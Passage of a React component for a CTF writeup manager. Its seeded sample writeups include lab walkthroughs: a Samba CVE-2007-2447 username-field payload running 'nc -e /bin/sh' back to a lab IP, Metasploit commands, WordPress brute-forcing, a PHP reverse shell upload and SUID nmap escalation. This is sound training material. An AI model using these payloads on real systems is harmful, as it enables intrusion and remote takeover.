import { useState, useMemo, useCallback } from 'react';
import {
  Search,
  Plus,
  Trash2,
  FileText,
  Eye,
  Pencil,
  BookOpen,
  Calendar,
  Download,
} from 'lucide-react';
import { Card } from '../components/ui/Card.jsx';
import { CopyButton } from '../components/ui/CopyButton.jsx';
import { Button } from '../components/ui/Button.jsx';
import { ToolHelp } from '../components/ui/ToolHelp.jsx';

const mono = 'JetBrains Mono, monospace';
const heading = 'Space Grotesk, sans-serif';

const CATEGORIES = [
  { name: 'Web', color: '#FB7185' },
  { name: 'Pwn', color: '#A78BFA' },
  { name: 'Crypto', color: '#FBBF24' },
  { name: 'Rev', color: '#6EE7B7' },
  { name: 'Forensics', color: '#7DD3FC' },
  { name: 'OSINT', color: '#F472B6' },
  { name: 'Misc', color: '#9CA3AF' },
];

const DIFFICULTIES = [
  { name: 'Easy', color: '#6EE7B7' },
  { name: 'Medium', color: '#FBBF24' },
  { name: 'Hard', color: '#FB7185' },
  { name: 'Insane', color: '#C4B5FD' },
];

const TAG_PILL_COLORS = [
  '#6EE7B7',
  '#7DD3FC',
  '#A78BFA',
  '#FBBF24',
  '#FB7185',
  '#F472B6',
  '#86EFAC',
  '#38BDF8',
  '#C4B5FD',
  '#FDE047',
];

function tagPillColor(tag) {
  let h = 0;
  for (let i = 0; i < tag.length; i++) h = (h + tag.charCodeAt(i) * (i + 1)) % TAG_PILL_COLORS.length;
  return TAG_PILL_COLORS[h];
}

const catColorMap = Object.fromEntries(CATEGORIES.map((c) => [c.name, c.color]));
const diffColorMap = Object.fromEntries(DIFFICULTIES.map((d) => [d.name, d.color]));

let _id = 100;
const uid = () => ++_id;

function normalizeWriteup(w) {
  return {
    ...w,
    tags: Array.isArray(w.tags) ? w.tags : [],
    ctfEvent: w.ctfEvent ?? '',
  };
}

const INITIAL_WRITEUPS = [
  {
    id: 1,
    title: 'Lame - HackTheBox',
    category: 'Pwn',
    platform: 'HackTheBox',
    difficulty: 'Easy',
    ctfEvent: '',
    tags: ['rce', 'smb', 'cve'],
    createdAt: '2026-02-14',
    content: `# Lame - HackTheBox

## Enumeration
nmap reveals SMB on port 445 running Samba 3.0.20.

\`\`\`bash
nmap -sV -sC -p- 10.10.10.3
\`\`\`

Port 445 is open with **Samba 3.0.20-Debian**. This version is known to be vulnerable.

## Exploitation
Samba 3.0.20 is vulnerable to CVE-2007-2447 (username map script).

The vulnerability allows remote code execution through shell metacharacters in the username field.

\`\`\`bash
smbclient //10.10.10.3/tmp
logon "./=\`nohup nc -e /bin/sh 10.10.14.1 4444\`"
\`\`\`

Alternatively, use Metasploit:

\`\`\`bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.1
run
\`\`\`

We get a **root shell** directly — no privilege escalation needed.

## Flag
- user: \`xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\`
- root: \`xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\`

## Takeaways
- Always check SMB version for known CVEs
- Samba < 3.0.25 is almost always exploitable`,
  },
  {
    id: 2,
    title: 'Pickle Rick - TryHackMe',
    category: 'Web',
    platform: 'TryHackMe',
    difficulty: 'Easy',
    ctfEvent: '',
    tags: ['rce', 'command-injection', 'sudo'],
    createdAt: '2026-02-20',
    content: `# Pickle Rick - TryHackMe

## Recon
Basic enumeration reveals a webserver on port 80. Viewing the page source gives us a username: \`R1ckRul3s\`.

Checking \`/robots.txt\` reveals the string \`Wubbalubbadubdub\` — likely a password.

## Exploitation
Login to the portal at \`/login.php\` with:
- Username: \`R1ckRul3s\`
- Password: \`Wubbalubbadubdub\`

The command panel allows OS command execution but filters \`cat\`. Use alternatives:

\`\`\`bash
less Sup3rS3cretPickl3Ingr3d.txt
sudo ls /root
sudo less /root/3rd.txt
\`\`\`

## Ingredients (Flags)
1. **First ingredient:** \`mr. meeseek hair\`
2. **Second ingredient:** Found in \`/home/rick/second ingredients\`
3. **Third ingredient:** In \`/root/3rd.txt\` (accessible via sudo)

## Notes
- The command filter blocks \`cat\` but not \`less\`, \`head\`, \`tail\`, \`strings\`
- The web user has full **sudo NOPASSWD** — instant root`,
  },
  {
    id: 3,
    title: 'Mr. Robot - TryHackMe',
    category: 'Web',
    platform: 'TryHackMe',
    difficulty: 'Medium',
    ctfEvent: '',
    tags: ['wordpress', 'privesc', 'sqli'],
    createdAt: '2026-03-05',
    content: `# Mr. Robot - TryHackMe

## Enumeration
\`\`\`bash
nmap -sV -sC 10.10.x.x
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
\`\`\`

Key findings:
- WordPress site on port 80
- \`/robots.txt\` contains \`fsocity.dic\` (wordlist) and \`key-1-of-3.txt\`
- \`/wp-login\` — WordPress login page

## Key 1
Download directly: \`curl http://10.10.x.x/key-1-of-3.txt\`

## Key 2 — WordPress Exploitation
Sort and deduplicate the wordlist:

\`\`\`bash
sort fsocity.dic | uniq > wordlist.txt
\`\`\`

Brute-force the login with **hydra** or **wpscan**:

\`\`\`bash
wpscan --url http://10.10.x.x --usernames Elliot --passwords wordlist.txt
\`\`\`

Credentials: \`Elliot:ER28-0652\`

Upload a **PHP reverse shell** via Appearance > Editor > 404.php, then trigger it.

Get key 2 from \`/home/robot/key-2-of-3.txt\` after cracking the MD5 hash in \`password.raw-md5\`.

## Key 3 — Privilege Escalation
Find SUID binaries:

\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`

**Nmap** has SUID bit set. Use interactive mode for root shell:

\`\`\`bash
nmap --interactive
!sh
cat /root/key-3-of-3.txt
\`\`\`

## Tools Used
- nmap, gobuster, wpscan, hydra
- John the Ripper / hashcat for MD5 cracking
- PHP reverse shell (pentestmonkey)`,
  },
  {
    id: 4,
    title: 'Bandit Wargame Notes',
    category: 'Misc',
    platform: 'OverTheWire',
    difficulty: 'Easy',
    ctfEvent: '',
    tags: ['linux', 'wargame'],
    createdAt: '2026-03-10',
    content: `# Bandit Wargame - OverTheWire

## Useful Concepts
Each level teaches a fundamental Linux/security concept:

- **Level 0-5:** Basic file operations, \`cat\`, \`find\`, hidden files
- **Level 6-10:** File properties, \`grep\`, piping, permissions
- **Level 11-15:** Encoding (base64, rot13), SSH keys, \`openssl\`
- **Level 16-20:** Port scanning, SSL connections, setuid exploitation
- **Level 21-25:** Cron jobs, scripting, Git exploration

## Key Commands

\`\`\`bash
# Find file by size
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null

# Decode base64
echo "data" | base64 -d

# ROT13
echo "data" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# SSL connection
openssl s_client -connect localhost:30001
\`\`\`

## Tips
- Always check **file permissions** and **ownership**
- \`2>/dev/null\` is your best friend to suppress errors
- When stuck, re-read the level description — hints are subtle`,
  },
].map(normalizeWriteup);

function renderInline(text) {
  const parts = [];
  let remaining = text;
  let key = 0;

  while (remaining.length > 0) {
    const codeMatch = remaining.match(/`([^`]+)`/);
    const boldMatch = remaining.match(/\*\*(.+?)\*\*/);
    const italicMatch = remaining.match(/(?<!\*)\*(?!\*)([^*]+?)\*(?!\*)/);

    let firstMatch = null;
    let firstIdx = remaining.length;

    if (codeMatch && codeMatch.index < firstIdx) {
      firstMatch = { type: 'code', match: codeMatch };
      firstIdx = codeMatch.index;
    }
    if (boldMatch && boldMatch.index < firstIdx) {
      firstMatch = { type: 'bold', match: boldMatch };
      firstIdx = boldMatch.index;
    }
    if (italicMatch && italicMatch.index < firstIdx) {
      firstMatch = { type: 'italic', match: italicMatch };
      firstIdx = italicMatch.index;
    }

    if (!firstMatch) {
      parts.push(remaining);
      break;
    }

    if (firstIdx > 0) {
      parts.push(remaining.slice(0, firstIdx));
    }

    if (firstMatch.type === 'bold') {
      parts.push(
        <strong key={key++} style={{ color: '#E2E8F0', fontWeight: 600 }}>
          {firstMatch.match[1]}
        </strong>
      );
      remaining = remaining.slice(firstIdx + firstMatch.match[0].length);
    } else if (firstMatch.type === 'italic') {
      parts.push(
        <em key={key++} style={{ color: 'rgba(255,255,255,0.85)', fontStyle: 'italic' }}>
          {firstMatch.match[1]}
        </em>
      );
      remaining = remaining.slice(firstIdx + firstMatch.match[0].length);
    } else {
      parts.push(
        <code
          key={key++}
          style={{
            fontFamily: mono,
            fontSize: '0.9em',
            background: 'rgba(167, 243, 208, 0.18)',
            color: '#A7F3D0',
            padding: '2px 6px',
            borderRadius: 4,
          }}
        >
          {firstMatch.match[1]}
        </code>
      );
      remaining = remaining.slice(firstIdx + firstMatch.match[0].length);
    }
  }

  return parts;
}

function renderPreview(content) {
  const lines = content.split('\n');
  const elements = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i];

    if (line.startsWith('```')) {
      const lang = line.slice(3).trim();
      const codeLines = [];
      i++;
      while (i < lines.length && !lines[i].startsWith('```')) {
        codeLines.push(lines[i]);
        i++;
      }
      i++;
      const codeText = codeLines.join('\n');
      elements.push(
        <div key={elements.length} style={{ position: 'relative', marginBottom: 12 }}>
          {lang && (
            <div
              style={{
                fontFamily: mono,
                fontSize: 9,
                color: 'rgba(255,255,255,0.3)',
                padding: '4px 12px',
                background: '#080C14',
                borderRadius: '6px 6px 0 0',
                border: '1px solid rgba(255,255,255,0.04)',
                borderBottom: 'none',
                textTransform: 'uppercase',
                letterSpacing: '0.5px',
              }}
            >
              {lang}
            </div>
          )}
          <div
            style={{
              background: '#0B0F18',
              borderRadius: lang ? '0 0 6px 6px' : 6,
              border: '1px solid rgba(255,255,255,0.04)',
              padding: '14px 16px',
              position: 'relative',
            }}
          >
            <pre
              style={{
                fontFamily: mono,
                fontSize: 11,
                lineHeight: '20px',
                color: '#C9D1D9',
                margin: 0,
                whiteSpace: 'pre-wrap',
                wordBreak: 'break-all',
              }}
            >
              {codeText}
            </pre>
            <div style={{ position: 'absolute', top: 8, right: 8 }}>
              <CopyButton text={codeText} />
            </div>
          </div>
        </div>
      );
      continue;
    }

    const trimmed = line.trim();
    if (/^---+$/.test(trimmed)) {
      elements.push(
        <hr
          key={elements.length}
          style={{
            border: 'none',
            borderTop: '1px solid rgba(255,255,255,0.08)',
            margin: '18px 0',
          }}
        />
      );
      i++;
      continue;
    }

    if (line.startsWith('> ')) {
      const quoteLines = [];
      while (i < lines.length && lines[i].startsWith('> ')) {
        quoteLines.push(lines[i].slice(2));
        i++;
      }
      elements.push(
        <blockquote
          key={elements.length}
          style={{
            margin: '12px 0',
            padding: '10px 14px 10px 16px',
            borderLeft: '3px solid #6EE7B7',
            background: 'rgba(110,231,183,0.06)',
            borderRadius: '0 6px 6px 0',
          }}
        >
          {quoteLines.map((ql, qi) => (
            <p
              key={qi}
              style={{
                fontFamily: mono,
                fontSize: 12,
                color: 'rgba(255,255,255,0.72)',
                lineHeight: '22px',
                margin: qi ? '8px 0 0' : 0,
              }}
            >
              {renderInline(ql)}
            </p>
          ))}
        </blockquote>
      );
      continue;
    }

    if (line.startsWith('### ')) {
      elements.push(
        <h3
          key={elements.length}
          style={{
            fontFamily: heading,
            fontSize: 14,
            fontWeight: 700,
            color: '#E2E8F0',
            margin: '16px 0 6px',
          }}
        >
          {renderInline(line.slice(4))}
        </h3>
      );
    } else if (line.startsWith('## ')) {
      elements.push(
        <h2
          key={elements.length}
          style={{
            fontFamily: heading,
            fontSize: 16,
            fontWeight: 700,
            color: '#E2E8F0',
            margin: '20px 0 8px',
            paddingBottom: 6,
            borderBottom: '1px solid rgba(255,255,255,0.04)',
          }}
        >
          {renderInline(line.slice(3))}
        </h2>
      );
    } else if (line.startsWith('# ')) {
      elements.push(
        <h1
          key={elements.length}
          style={{
            fontFamily: heading,
            fontSize: 20,
            fontWeight: 700,
            color: '#E2E8F0',
            margin: '0 0 12px',
          }}
        >
          {renderInline(line.slice(2))}
        </h1>
      );
    } else if (line.startsWith('- ') || line.startsWith('* ')) {
      const items = [];
      const prefixLen = 2;
      while (i < lines.length && (lines[i].startsWith('- ') || lines[i].startsWith('* '))) {
        items.push(lines[i].slice(prefixLen));
        i++;
      }
      elements.push(
        <ul
          key={elements.length}
          style={{
            margin: '6px 0',
            paddingLeft: 20,
            listStyleType: 'disc',
          }}
        >
          {items.map((item, idx) => (
            <li
              key={idx}
              style={{
                fontFamily: mono,
                fontSize: 12,
                color: 'rgba(255,255,255,0.7)',
                lineHeight: '22px',
                marginBottom: 2,
              }}
            >
              {renderInline(item)}
            </li>
          ))}
        </ul>
      );
      continue;
    } else if (line.trim() === '') {
      elements.push(<div key={elements.length} style={{ height: 8 }} />);
    } else {
      elements.push(
        <p
          key={elements.length}
          style={{
            fontFamily: mono,
            fontSize: 12,
            color: 'rgba(255,255,255,0.7)',
            lineHeight: '22px',
            margin: '4px 0',
          }}
        >
          {renderInline(line)}
        </p>
      );
    }
    i++;
  }

  return elements;
}

function sanitizeFilename(title) {
  const base = (title || 'writeup').replace(/[/\\?%*:|"<>]/g, '-').trim() || 'writeup';
  return base.slice(0, 80);
}

function buildFrontmatter(w) {
  const tagsYaml = (w.tags || [])
    .map((t) => JSON.stringify(String(t)))
    .join(', ');
  const lines = [
    '---',
    `title: ${JSON.stringify(w.title || 'Untitled')}`,
    `category: ${JSON.stringify(w.category || '')}`,
    `difficulty: ${JSON.stringify(w.difficulty || '')}`,
    `platform: ${JSON.stringify(w.platform || '')}`,
    `tags: [${tagsYaml}]`,
    `date: ${JSON.stringify(w.createdAt || '')}`,
  ];
  if (w.ctfEvent && w.ctfEvent.trim()) {
    lines.push(`ctf_event: ${JSON.stringify(w.ctfEvent.trim())}`);
  }
  lines.push('---', '');
  return lines.join('\n');
}

function exportWriteupMarkdown(w) {
  const body = buildFrontmatter(w) + (w.content || '').replace(/^\s+/, '');
  const blob = new Blob([body], { type: 'text/markdown;charset=utf-8' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${sanitizeFilename(w.title)}.md`;
  a.click();
  URL.revokeObjectURL(url);
}

function TagPills({ tags, max = 99, size = 'sm' }) {
  const list = (tags || []).slice(0, max);
  const fontSize = size === 'sm' ? 8 : 9;
  const pad = size === 'sm' ? '2px 6px' : '3px 8px';
  if (!list.length) return null;
  return (
    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, marginTop: 4 }}>
      {list.map((t) => {
        const c = tagPillColor(t);
        return (
          <span
            key={t}
            style={{
              fontFamily: mono,
              fontSize,
              fontWeight: 700,
              padding: pad,
              borderRadius: 4,
              background: `${c}22`,
              color: c,
              textTransform: 'lowercase',
              letterSpacing: '0.2px',
            }}
          >
            {t}
          </span>
        );
      })}
    </div>
  );
}

export default function Writeups() {
  const [writeups, setWriteups] = useState(INITIAL_WRITEUPS);
  const [selectedId, setSelectedId] = useState(1);
  const [search, setSearch] = useState('');
  const [tagFilters, setTagFilters] = useState([]);
  const [mode, setMode] = useState('preview');

  const selected = writeups.find((w) => w.id === selectedId);

  const allTags = useMemo(() => {
    const set = new Set();
    writeups.forEach((w) => (w.tags || []).forEach((t) => set.add(t)));
    return Array.from(set).sort((a, b) => a.localeCompare(b));
  }, [writeups]);

  const toggleTagFilter = useCallback((tag) => {
    setTagFilters((prev) => (prev.includes(tag) ? prev.filter((t) => t !== tag) : [...prev, tag]));
  }, []);

  const clearTagFilters = useCallback(() => setTagFilters([]), []);

  const filtered = useMemo(() => {
    let list = writeups;
    if (tagFilters.length > 0) {
      list = list.filter((w) => tagFilters.some((t) => (w.tags || []).includes(t)));
    }
    if (!search.trim()) return list;
    const q = search.toLowerCase();
    return list.filter((w) => {
      const tagStr = (w.tags || []).join(' ').toLowerCase();
      return (
        w.title.toLowerCase().includes(q) ||
        w.category.toLowerCase().includes(q) ||
        w.platform.toLowerCase().includes(q) ||
        (w.ctfEvent || '').toLowerCase().includes(q) ||
        tagStr.includes(q) ||
        w.content.toLowerCase().includes(q)
      );
    });
  }, [writeups, search, tagFilters]);

  const addWriteup = () => {
    const id = uid();
    const today = new Date().toISOString().slice(0, 10);
    const newWriteup = normalizeWriteup({
      id,
      title: '',
      category: 'Web',
      platform: '',
      difficulty: 'Easy',
      ctfEvent: '',
      tags: [],
      createdAt: today,
      content: '# New Writeup\n\n## Enumeration\n\n## Exploitation\n\n## Flags\n',
    });
    setWriteups((prev) => [newWriteup, ...prev]);
    setSelectedId(id);
    setMode('edit');
  };

  const updateWriteup = (id, field, value) => {
    setWriteups((prev) =>
      prev.map((w) => (w.id === id ? { ...w, [field]: value } : w))
    );
  };

  const setTagsFromInput = (id, raw) => {
    const tags = raw
      .split(/[,;]+/)
      .map((s) => s.trim())
      .filter(Boolean);
    updateWriteup(id, 'tags', tags);
  };

  const deleteWriteup = (id) => {
    setWriteups((prev) => prev.filter((w) => w.id !== id));
    if (selectedId === id) {
      const remaining = writeups.filter((w) => w.id !== id);
      setSelectedId(remaining[0]?.id || null);
    }
  };

  const getSnippet = (content) => {
    const lines = content.split('\n').filter((l) => l.trim() && !l.startsWith('#'));
    const text = lines.slice(0, 2).join(' ').replace(/[*`#\-]/g, '').trim();
    return text.length > 80 ? text.slice(0, 80) + '…' : text;
  };

  const wordCount = selected ? selected.content.trim().split(/\s+/).filter(Boolean).length : 0;
  const charCount = selected ? selected.content.length : 0;

  return (
    <div style={{ height: 'calc(100vh - 120px)', display: 'flex', flexDirection: 'column' }}>
      {/* TOP BAR */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
          <div
            style={{
              width: 38,
              height: 38,
              borderRadius: 10,
              background: 'rgba(110,231,183,0.12)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
            }}
          >
            <BookOpen size={18} style={{ color: '#6EE7B7' }} />
          </div>
          <h1 style={{ fontFamily: heading, fontSize: 22, fontWeight: 700, color: '#E2E8F0', margin: 0 }}>
            Writeups
          </h1>
          <span style={{ fontFamily: mono, fontSize: 10, color: 'rgba(255,255,255,0.3)' }}>
            {writeups.length} writeup{writeups.length !== 1 ? 's' : ''}
          </span>
          <ToolHelp title="Writeups" description="CTF writeup manager. Create, edit, and organize writeups with markdown support." steps={["Create a new writeup for a solved challenge","Write your solution using the editor","Tag writeups by CTF name and category","Browse and search your writeup collection"]} tips={["Writeups are saved locally and persist across sessions","Use categories to organize by challenge type","Great for building your personal knowledge base"]} />
        </div>
      </div>

      {/* MAIN LAYOUT */}
      <div style={{ display: 'flex', gap: 16, flex: 1, minHeight: 0 }}>
        {/* LEFT PANEL — WRITEUP LIST */}
        <div
          style={{
            width: 300,
            minWidth: 300,
            background: '#11151E',
            borderRadius: 10,
            border: '1px solid rgba(255,255,255,0.04)',
            display: 'flex',
            flexDirection: 'column',
            overflow: 'hidden',
          }}
        >
          {/* Search + New */}
          <div style={{ padding: '14px 14px 10px', display: 'flex', flexDirection: 'column', gap: 8 }}>
            <div style={{ position: 'relative' }}>
              <Search
                size={13}
                style={{
                  position: 'absolute',
                  left: 10,
                  top: '50%',
                  transform: 'translateY(-50%)',
                  color: 'rgba(255,255,255,0.2)',
                  pointerEvents: 'none',
                }}
              />
              <input
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Search title, tags, content..."
                style={{
                  fontFamily: mono,
                  fontSize: 11,
                  color: '#E2E8F0',
                  background: 'rgba(255,255,255,0.03)',
                  border: '1px solid rgba(255,255,255,0.06)',
                  borderRadius: 6,
                  padding: '8px 10px 8px 30px',
                  width: '100%',
                  outline: 'none',
                  boxSizing: 'border-box',
                }}
              />
            </div>
            {allTags.length > 0 && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                  <span
                    style={{
                      fontFamily: mono,
                      fontSize: 8,
                      fontWeight: 600,
                      color: 'rgba(255,255,255,0.3)',
                      textTransform: 'uppercase',
                      letterSpacing: '0.5px',
                    }}
                  >
                    Filter tags
                  </span>
                  {tagFilters.length > 0 && (
                    <button
                      type="button"
                      onClick={clearTagFilters}
                      style={{
                        fontFamily: mono,
                        fontSize: 8,
                        color: '#6EE7B7',
                        background: 'none',
                        border: 'none',
                        cursor: 'pointer',
                        padding: 0,
                        textDecoration: 'underline',
                      }}
                    >
                      Clear
                    </button>
                  )}
                </div>
                <div style={{ display: 'flex', flexWrap: 'wrap', gap: 4, maxHeight: 72, overflowY: 'auto' }}>
                  {allTags.map((t) => {
                    const active = tagFilters.includes(t);
                    const c = tagPillColor(t);
                    return (
                      <button
                        key={t}
                        type="button"
                        onClick={() => toggleTagFilter(t)}
                        style={{
                          fontFamily: mono,
                          fontSize: 8,
                          fontWeight: 700,
                          padding: '3px 8px',
                          borderRadius: 4,
                          border: active ? `1px solid ${c}` : '1px solid rgba(255,255,255,0.08)',
                          cursor: 'pointer',
                          background: active ? `${c}28` : 'rgba(255,255,255,0.04)',
                          color: active ? c : 'rgba(255,255,255,0.45)',
                          textTransform: 'lowercase',
                        }}
                      >
                        {t}
                      </button>
                    );
                  })}
                </div>
              </div>
            )}
            <Button variant="ghost" size="sm" onClick={addWriteup} style={{ width: '100%' }}>
              <Plus size={13} />
              New Writeup
            </Button>
          </div>

          {/* List */}
          <div style={{ flex: 1, overflowY: 'auto', padding: '0 6px 10px' }}>
            {filtered.length === 0 && (
              <div
                style={{
                  fontFamily: mono,
                  fontSize: 11,
                  color: 'rgba(255,255,255,0.2)',
                  textAlign: 'center',
                  padding: 30,
                }}
              >
                {search || tagFilters.length ? 'No writeups match filters' : 'No writeups yet'}
              </div>
            )}
            {filtered.map((w) => {
              const isActive = w.id === selectedId;
              const catColor = catColorMap[w.category] || '#9CA3AF';
              return (
                <div
                  key={w.id}
                  onClick={() => {
                    setSelectedId(w.id);
                    setMode('preview');
                  }}
                  style={{
                    padding: '12px 16px',
                    borderLeft: isActive ? '3px solid #6EE7B7' : '3px solid transparent',
                    borderRadius: 6,
                    cursor: 'pointer',
                    transition: 'all 0.15s',
                    background: isActive ? 'rgba(110,231,183,0.04)' : 'transparent',
                    marginBottom: 2,
                  }}
                  onMouseEnter={(e) => {
                    if (!isActive) e.currentTarget.style.background = 'rgba(255,255,255,0.02)';
                  }}
                  onMouseLeave={(e) => {
                    if (!isActive) e.currentTarget.style.background = 'transparent';
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
                    <span
                      style={{
                        fontFamily: heading,
                        fontSize: 13,
                        fontWeight: 600,
                        color: isActive ? '#E2E8F0' : 'rgba(255,255,255,0.7)',
                        flex: 1,
                        whiteSpace: 'nowrap',
                        overflow: 'hidden',
                        textOverflow: 'ellipsis',
                      }}
                    >
                      {w.title || 'Untitled'}
                    </span>
                    <button
                      onClick={(e) => {
                        e.stopPropagation();
                        deleteWriteup(w.id);
                      }}
                      style={{
                        background: 'none',
                        border: 'none',
                        cursor: 'pointer',
                        color: 'rgba(255,255,255,0.1)',
                        padding: 2,
                        display: 'flex',
                        flexShrink: 0,
                        transition: 'color 0.15s',
                      }}
                      onMouseEnter={(e) => (e.currentTarget.style.color = '#FB7185')}
                      onMouseLeave={(e) => (e.currentTarget.style.color = 'rgba(255,255,255,0.1)')}
                    >
                      <Trash2 size={11} />
                    </button>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 6, flexWrap: 'wrap' }}>
                    <span
                      style={{
                        fontFamily: mono,
                        fontSize: 9,
                        fontWeight: 700,
                        padding: '2px 6px',
                        borderRadius: 3,
                        background: `${catColor}18`,
                        color: catColor,
                        textTransform: 'uppercase',
                        letterSpacing: '0.3px',
                      }}
                    >
                      {w.category}
                    </span>
                    <span style={{ fontFamily: mono, fontSize: 9, color: 'rgba(255,255,255,0.25)' }}>
                      {w.createdAt}
                    </span>
                  </div>
                  <TagPills tags={w.tags} max={4} size="sm" />
                  <div
                    style={{
                      fontFamily: mono,
                      fontSize: 10,
                      color: 'rgba(255,255,255,0.25)',
                      lineHeight: '16px',
                      overflow: 'hidden',
                      display: '-webkit-box',
                      WebkitLineClamp: 2,
                      WebkitBoxOrient: 'vertical',
                      marginTop: 6,
                    }}
                  >
                    {getSnippet(w.content)}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* RIGHT PANEL — EDITOR / VIEWER */}
        <div style={{ flex: 1, minWidth: 0, display: 'flex', flexDirection: 'column', gap: 0 }}>
          {!selected ? (
            <div
              style={{
                display: 'flex',
                flexDirection: 'column',
                alignItems: 'center',
                justifyContent: 'center',
                height: '100%',
                gap: 12,
                color: 'rgba(255,255,255,0.2)',
              }}
            >
              <FileText size={40} />
              <span style={{ fontFamily: mono, fontSize: 12 }}>Select a writeup to view</span>
            </div>
          ) : (
            <>
              {/* HEADER SECTION */}
              <Card
                style={{
                  background: '#11151E',
                  border: '1px solid rgba(255,255,255,0.04)',
                  padding: '16px 20px',
                  borderRadius: '10px 10px 0 0',
                  flexShrink: 0,
                }}
              >
                {/* Title */}
                <input
                  value={selected.title}
                  onChange={(e) => updateWriteup(selected.id, 'title', e.target.value)}
                  placeholder="Writeup title..."
                  style={{
                    fontFamily: heading,
                    fontSize: 20,
                    fontWeight: 700,
                    color: '#E2E8F0',
                    background: 'transparent',
                    border: 'none',
                    outline: 'none',
                    width: '100%',
                    padding: 0,
                    marginBottom: 14,
                  }}
                />

                <div style={{ display: 'flex', gap: 12, alignItems: 'flex-start', flexWrap: 'wrap' }}>
                  {/* Category */}
                  <div>
                    <label
                      style={{
                        fontFamily: mono,
                        fontSize: 9,
                        fontWeight: 600,
                        color: 'rgba(255,255,255,0.35)',
                        textTransform: 'uppercase',
                        letterSpacing: '0.5px',
                        display: 'block',
                        marginBottom: 5,
                      }}
                    >
                      Category
                    </label>
                    <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                      {CATEGORIES.map((cat) => {
                        const active = selected.category === cat.name;
                        return (
                          <button
                            key={cat.name}
                            type="button"
                            onClick={() => updateWriteup(selected.id, 'category', cat.name)}
                            style={{
                              fontFamily: mono,
                              fontSize: 9,
                              fontWeight: 700,
                              padding: '4px 8px',
                              borderRadius: 4,
                              border: 'none',
                              cursor: 'pointer',
                              textTransform: 'uppercase',
                              letterSpacing: '0.3px',
                              transition: 'all 0.15s',
                              background: active ? `${cat.color}25` : 'rgba(255,255,255,0.03)',
                              color: active ? cat.color : 'rgba(255,255,255,0.3)',
                            }}
                          >
                            {cat.name}
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  <div style={{ width: 1, height: 36, background: 'rgba(255,255,255,0.04)', alignSelf: 'center' }} />

                  {/* Difficulty */}
                  <div>
                    <label
                      style={{
                        fontFamily: mono,
                        fontSize: 9,
                        fontWeight: 600,
                        color: 'rgba(255,255,255,0.35)',
                        textTransform: 'uppercase',
                        letterSpacing: '0.5px',
                        display: 'block',
                        marginBottom: 5,
                      }}
                    >
                      Difficulty
                    </label>
                    <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                      {DIFFICULTIES.map((diff) => {
                        const active = selected.difficulty === diff.name;
                        return (
                          <button
                            key={diff.name}
                            type="button"
                            onClick={() => updateWriteup(selected.id, 'difficulty', diff.name)}
                            style={{
                              fontFamily: mono,
                              fontSize: 9,
                              fontWeight: 700,
                              padding: '4px 8px',
                              borderRadius: 4,
                              border: 'none',
                              cursor: 'pointer',
                              transition: 'all 0.15s',
                              background: active ? `${diff.color}25` : 'rgba(255,255,255,0.03)',
                              color: active ? diff.color : 'rgba(255,255,255,0.3)',
                            }}
                          >
                            {diff.name}
                          </button>
                        );
                      })}
                    </div>
                  </div>

                  <div style={{ width: 1, height: 36, background: 'rgba(255,255,255,0.04)', alignSelf: 'center' }} />

                  {/* Platform */}
                  <div>
                    <label
                      style={{
                        fontFamily: mono,
                        fontSize: 9,
                        fontWeight: 600,
                        color: 'rgba(255,255,255,0.35)',
                        textTransform: 'uppercase',
                        letterSpacing: '0.5px',
                        display: 'block',
                        marginBottom: 5,
                      }}
                    >
                      Platform
                    </label>
                    <input
                      value={selected.platform}
                      onChange={(e) => updateWriteup(selected.id, 'platform', e.target.value)}
                      placeholder="HTB, THM..."
                      style={{
                        fontFamily: mono,
                        fontSize: 11,
                        color: '#E2E8F0',
                        background: 'rgba(255,255,255,0.03)',
                        border: '1px solid rgba(255,255,255,0.06)',
                        borderRadius: 5,
                        padding: '5px 10px',
                        outline: 'none',
                        width: 100,
                      }}
                    />
                  </div>

                  {/* CTF Event */}
                  <div style={{ flex: '1 1 200px', minWidth: 160 }}>
                    <label
                      style={{
                        fontFamily: mono,
                        fontSize: 9,
                        fontWeight: 600,
                        color: 'rgba(255,255,255,0.35)',
                        textTransform: 'uppercase',
                        letterSpacing: '0.5px',
                        display: 'block',
                        marginBottom: 5,
                      }}
                    >
                      CTF event
                    </label>
                    <input
                      value={selected.ctfEvent || ''}
                      onChange={(e) => updateWriteup(selected.id, 'ctfEvent', e.target.value)}
                      placeholder="e.g. HackTheBox Cyber Apocalypse 2026"
                      style={{
                        fontFamily: mono,
                        fontSize: 11,
                        color: '#E2E8F0',
                        background: 'rgba(255,255,255,0.03)',
                        border: '1px solid rgba(255,255,255,0.06)',
                        borderRadius: 5,
                        padding: '5px 10px',
                        outline: 'none',
                        width: '100%',
                        boxSizing: 'border-box',
                      }}
                    />
                  </div>

                  {/* Spacer */}
                  <div style={{ flex: 1, minWidth: 8 }} />

                  {/* Export + Mode Toggle */}
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', gap: 8 }}>
                    <button
                      type="button"
                      onClick={() => exportWriteupMarkdown(selected)}
                      style={{
                        fontFamily: mono,
                        fontSize: 10,
                        fontWeight: 600,
                        padding: '6px 12px',
                        borderRadius: 6,
                        border: '1px solid rgba(255,255,255,0.1)',
                        cursor: 'pointer',
